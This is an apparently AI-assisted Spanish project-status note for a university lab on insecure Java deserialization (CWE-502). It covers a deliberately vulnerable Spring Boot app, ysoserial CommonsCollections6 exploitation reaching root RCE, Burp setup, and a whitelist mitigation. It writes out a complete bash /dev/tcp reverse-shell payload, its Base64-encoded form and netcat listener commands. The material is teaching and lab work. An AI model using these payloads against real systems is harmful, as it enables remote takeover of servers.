# TPI — Deserialización Insegura en Java (CWE-502)

Seguridad en el Desarrollo de Software, UTN FRC. Cantero Santiago (81658) — Arias Felipe (82412), 4K3.

Contexto pa' retomar sesión sin releer todo. Fuente de verdad del laboratorio en sí: `lab-deserializacion/README.md`. Fuente de verdad del proyecto completo: `LAB.md`.

## Estado: laboratorio completo y verificado en Docker real (no simulado). Front reemplazado por tienda demo "TechStore" (ver abajo), también verificado en Docker real. **Última verificación 2026-11-15.**

Resultado verificación (secuencia completa, Docker Desktop levantado):
- `docker-compose build target-app` → OK
- `up -d target-app` + `/cart/health` → 200
- `/` (front) → carga tienda real (no blank/default), ambos botones de checkout presentes
- `docker-compose build exploit` → OK
- `docker-compose run --rm exploit http://target-app:8080` (default `id`) → payload CC6 enviado a `/cart/restore`
- `/cart/debug-output` → `uid=0(root) gid=0(root) groups=0(root)` → RCE real confirmado
- `/cart/restore-filtered` → rechazado por whitelist (mitigación funciona)
- Modo `PRINT_ONLY=1` en `exploit.sh` → imprime Base64 sin enviar, para pegar en Burp Repeater (ver README sección 5)

Nota menor: mensaje de rechazo del server dice "Rechazado por ObjectInputFilter" (wording del mensaje, no la implementación real — que es `resolveClass()` override en `WhitelistObjectInputStream`, ver hallazgo #2 abajo). No es bug, no se tocó.

**Trabajo en rama `feature/tienda-demo-cwe502`, sin mergear a `master` todavía** — decisión de integración pendiente, no asumir. Reviewer fresco (Opus) ya corrió sobre el rango completo de la rama: 0 Critical, 0 Important, 4 Minor deferred (innerHTML sin escapar en el log de actividad, checkout ignora el carrito cosmético por diseño, sin guard de doble-click, nota de atribución del reviewer irrelevante). Ver detalle completo en `lab-deserializacion/README.md` y en el historial de commits de la rama.

### Qué hay armado

```
Seguridad/
├── LAB.md                          # propuesta TPI original
├── lab-deserializacion/
│   ├── docker-compose.yml          # target-app + exploit (profile exploit)
│   ├── target-app/                 # Spring Boot 2.7.18, Java 8, commons-collections 3.1 (vuln a propósito)
│   │   └── src/main/java/com/tpi/vulnlab/
│   │       ├── controller/CartController.java      # sink vuln l.67-86, mitigación l.96+, debug-output
│   │       ├── security/WhitelistObjectInputStream.java  # mitigación real, funciona
│   │       └── model/Cart.java, CartItem.java
│   │   └── src/main/resources/static/index.html   # tienda demo "TechStore" (reemplaza dashboard viejo de botones), Spring lo sirve en /
│   ├── exploit/                    # contenedor black-box: clona+compila ysoserial, exploit.sh (default CMD `id`, modo PRINT_ONLY para Burp Repeater)
│   ├── mitigation/CartControllerSecure.java  # solo referencia/informe, no compila en el build
│   └── README.md                   # instrucciones completas + hallazgos + sección 5 (front demo) NUEVA
└── .gitignore
```

### Endpoints target-app (puerto 8080, solo 127.0.0.1)

- `GET /cart/health` — sanity check
- `GET /cart/save` — genera Cart serializado Base64 legítimo
- `POST /cart/restore` — **sink vulnerable**, `ObjectInputStream.readObject()` sin filtro
- `POST /cart/restore-filtered` — **endpoint mitigado**, usa `WhitelistObjectInputStream`
- `GET /cart/debug-output` — harness de demo (no vector real): lee path hardcodeado `/tmp/id_output.txt`, lo muestra en el front sin `docker exec`
- `GET /` — front estático (`static/index.html`): tienda "TechStore" — catálogo cosmético + "ver carrito guardado" (vulnerable/mitigado, dispara el request real) + panel RCE + log

### Comandos base

```bash
cd lab-deserializacion
docker-compose up -d target-app
docker-compose build exploit
docker-compose run --rm exploit http://target-app:8080 "touch /tmp/pwned" /cart/restore          # vulnerable: ejecuta
docker-compose run --rm exploit http://target-app:8080 "touch /tmp/pwned2" /cart/restore-filtered # mitigado: rechaza
docker-compose down
```

## Dos hallazgos reales (no obvios, van en el informe)

1. **CommonsCollections1 no funciona en JDK 8 actualizado.** Oracle parchó `AnnotationInvocationHandler.readObject()` desde 8u71+ (valida tipos post-deserialización) → `IncompleteAnnotationException`, sin RCE. Se pivoteó a **CommonsCollections6** (entra vía `HashSet/HashMap.readObject()` → `TiedMapEntry.hashCode()` → `LazyMap` → mismo chain de transformers), que no pasa por la clase parcheada y sí funciona. Verificado en build con JDK 8u512.
2. **`java.io.ObjectInputFilter` (JEP 290) NO existe en OpenJDK 8** (verificado directo con `javac` en `eclipse-temurin:8-jdk` y `maven:3.8-eclipse-temurin-8`, ambos 8u392/8u512) — es Java 9+, o backport propietario de Oracle. La receta "mitigar con ObjectInputFilter" que aparece en la mayoría de guías no es viable en Java 8 real. Mitigación real implementada: subclasear `ObjectInputStream` y sobrescribir `resolveClass()` (técnica clásica, Java 5+) → `WhitelistObjectInputStream.java`.

Detalle del gadget chain CC1 (whitebox) y comparación black-box/white-box: ver `lab-deserializacion/README.md` secciones 2-3.

## Extensión Burp "Java Deserialization Scanner" — verificada funcionando (2026-11-16)

Probada en vivo contra el target real (no simulado). **RCE confirmado**: `CommonsCollections6` vía la extensión → `uid=0(root) gid=0(root) groups=0(root)`. Guía completa paso a paso (instalación, config, troubleshooting, tabla de resultados por gadget) en `lab-deserializacion/README.md` sección 6 — **no duplicar acá, esto es solo el puntero + lo crítico para no repetir errores ya resueltos**.

**Ubicación de los binarios** (versionados en git desde que se creó el repo nuevo `MrCanter1/Laboratorio-de-Deserializacion-Insegura`, ~250MB total — decisión explícita del usuario de incluir las herramientas en el repo). **Rutas absolutas reales confirmadas funcionando** (ojo: si en algún momento se mueve este directorio hay que reconfigurar la extensión, ya pasó una vez — error `CreateProcess error=2, The system cannot find the file specified` cuando la config apuntaba a un path viejo en scratchpad):
```
C:\Users\santi\OneDrive\Escritorio\Facultad\Seguridad\lab-deserializacion\tools\jdk8u512-b09\bin\java.exe              # JDK 8 portable, NO el JDK 21 del sistema
C:\Users\santi\OneDrive\Escritorio\Facultad\Seguridad\lab-deserializacion\tools\ysoserial-0.0.6-SNAPSHOT-all.jar       # mismo jar que compila exploit/Dockerfile
```
Configurar esas dos rutas en Burp → extensión → tab **Configuration** → campos "java path" / "ysoserial jar path".

**4 trampas reales ya resueltas, no repetir:**
1. Host tiene JDK 21 (module system) → `CommonsCollections3` tira `IllegalAccessError` sobre clases internas `com.sun.org.apache.xalan...`. Fix: usar el JDK 8 portable de arriba, nunca el `java` del PATH del sistema.
2. Burp proxy default en `127.0.0.1:8080` choca con el puerto del target-app en `docker-compose.yml`. Se levantó el target en `8081` con `docker run` directo (no se tocó el `docker-compose.yml` versionado) — ver README 6.4 para el comando exacto.
3. Campo de comando en la tab Exploiting espera **2 argumentos exactos** (gadget + comando), formato CLI de ysoserial. Un comando con espacios SIN comillas (ej. `CommonsCollections6 /bin/sh -c id>/tmp/id_output.txt` así, suelto) se tokeniza mal (4 args en vez de 2) y cuelga el proceso `java.exe` generando el payload — hay que matarlo a mano (Task Manager) y reintentar con comillas: `CommonsCollections6 "/bin/sh -c id>/tmp/id_output.txt"`.
4. Si se mueve/recrea `tools/`, la config de la extensión queda con el path viejo (no se auto-actualiza) → `CreateProcess error=2`. Reconfigurar java path/ysoserial jar path con las rutas absolutas de arriba.

**Resultado por gadget contra `commons-collections:3.1`** (tabla completa en README 6.8): CC6 RCE confirmado con output real. CC1/CC3/CC5 bloqueados, cada uno por una causa distinta y verificada (parche `AnnotationInvocationHandler`, hardening `jdk.xml.enableTemplatesImplDeserialization`, hardening de `toString()` en `BadAttributeValueExpException` — los dos últimos son **hallazgos nuevos**, no estaban antes de usar la extensión). CC7 quedó sin confirmar con output verificable, pendiente reintentar. CC2/CC4 descartados, dependen de `commons-collections4` que no está en el classpath.

## Reverse shell — verificada funcionando (2026-11-16), detalle completo en README sección 7

Dos variantes probadas con éxito real (shell interactiva root confirmada en ambas): listener en container propio dentro de `lab-net` (nombre DNS `revshell-listener`), y listener en el **host Windows real** vía `host.docker.internal` (más fuerte para la demo, cruza la frontera container→host real). Mecanismo: `bash -i >& /dev/tcp/<host>/<puerto> 0>&1` no se puede mandar directo (tiene espacios, `Runtime.exec(String)`/campo de comando de la extensión tokenizan por espacios) — se resuelve con el truco `/bin/bash -c {echo,<BASE64>}|{base64,-d}|bash` (brace-expansion, queda en 3 tokens sin espacios internos).

**Payload guardado, puerto 4444** (regenerar Base64 si se cambia host/puerto, receta en README 7.4):
```
RSHELL='bash -i >& /dev/tcp/host.docker.internal/4444 0>&1'
Base64: YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=
```
Campo de comando para la tab Exploiting de Burp (gadget `CommonsCollections6`):
```
CommonsCollections6 "/bin/bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=}|{base64,-d}|bash"
```

**Listener en Windows, dos opciones:**
- `C:\Users\santi\Downloads\nc64.exe -lvnp 4444` (descargado por el usuario, no versionado — si se usa en la demo, mover a `lab-deserializacion/tools/`).
- `python lab-deserializacion\tools\revshell_listener.py 4444` — script propio, no depende de descargar nada, usa el `python` del WindowsApps que ya está en PATH. Queda en `lab-deserializacion/tools/revshell_listener.py` (sí versionado, es texto chico).

Importante: el listener tiene que estar escuchando ANTES de mandar el ataque, sino falla en silencio.

## Documentos ya publicados (Claude Docs, no son archivos locales)

| Doc | URL | Contenido |
|---|---|---|
| Informe técnico | https://claude.ai/artifact/NWJWkj4jEuH6gjpNwvG3Ec | marco teórico, arquitectura, demo black/white box, mitigación, conclusiones |
| Guión de exposición | https://claude.ai/artifact/WAQK9QSYRMoAyvy4JsvtDv | reparto de roles presentación: compañero explica código vuln+remediación (con file:line exactos), yo explotación en vivo, checklist pre-demo |
| Cómo levantar el lab | https://claude.ai/artifact/CGj8ARoyQLRAUXxqNRwGjk | setup paso a paso, sanity check, shutdown, troubleshooting |

Los tres se linkean entre sí. Si hay que tocar alguno: son docs vivos vía `mcp__claude_ai_Claude_Docs__*`, no HTML estático — usar `read` con la URL antes de editar.

## Git

Repo con rama `feature/tienda-demo-cwe502` activa (parte de `master`, commit base `3e0e522`). Commits de la rama: PRINT_ONLY en `exploit.sh`, tienda demo en `index.html`. **Decisión de merge/PR pendiente — usuario pidió no insistir con esto por ahora, foco en el lab.** Cuando se retome: opciones son merge local a `master`, push+PR, o dejar la rama como está. Atribución commits actuales: `Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>`.

## Pendiente / abierto (no asumir, confirmar con usuario antes de tocar)

- **Decidir qué hacer con `feature/tienda-demo-cwe502`** (merge/PR/dejar como está) — pausado a pedido del usuario.
- Se evaluó `calc.exe` como PoC visual de RCE y se descartó: `target-app` corre en contenedor Linux, sin entorno gráfico Windows. Se eligió `id` en su lugar (comando arbitrario, salida verificable).
- **Parametrizar gadget en `exploit.sh`.** Hoy CC6 está hardcodeado (línea ~35, `java -jar "${JAR}" CommonsCollections6 "${CMD}"`). Guión de exposición §4.2 pide mostrar primero CC1 fallando y después CC6 funcionando — hoy eso requiere editar el script a mano en vivo. Si se quiere demo sin editar código en el momento: agregar 4º arg opcional `GADGET` (default `CommonsCollections6`) en `exploit.sh`. **No implementado, no pedido explícitamente — solo flaggeado.**
- **CVE asociado y búsqueda de PoC — contenido nuevo, charlado en sesión, agregado a `lab-deserializacion/README.md` sección 2.2:** librería vulnerable es `commons-collections:3.1` (`pom.xml`). CVEs: **CVE-2015-7501** (principal, `InvokerTransformer`/`InstantiateFactory`/`InstantiateTransformer`, rango 3.0–3.2.1, fix en 3.2.2, CVSS 9.8) y **CVE-2015-6420** (mismo rango). No hay entrada propia en Exploit-DB — PoC vive en GitHub: [frohoff/ysoserial](https://github.com/frohoff/ysoserial) (el que ya usa `exploit/Dockerfile`) y [grrrdog/java-deserialization-cheat-sheet](https://github.com/grrrdog/java-deserialization-cheat-sheet) como mapa de referencia. Metodología completa de detección/explotación caja negra sin ver código (firma de bytes `0xACED`/`rO0`, comportamiento ante basura, fingerprint de gadget chain, confirmación de RCE ciego por out-of-band/time-based) → README sección 2.1. **Pendiente: decidir si esto entra al informe/exposición o queda solo de referencia para responder preguntas en la entrega.**
- Exposición en clase en sí (entrega en vivo) — fuera de alcance de código/docs, ya con todo el material armado.
- Deliverables de `LAB.md` ítems 1-4 (lab funcional, black box, white box, mitigación documentada+verificada) → **completos**. Ítem 5 (informe escrito) → **completo** (doc Claude, pero sin el contenido de CVE/metodología caja negra nueva — evaluar si agregarlo). Ítem 6 (exposición) → materiales listos, falta la entrega en sí.
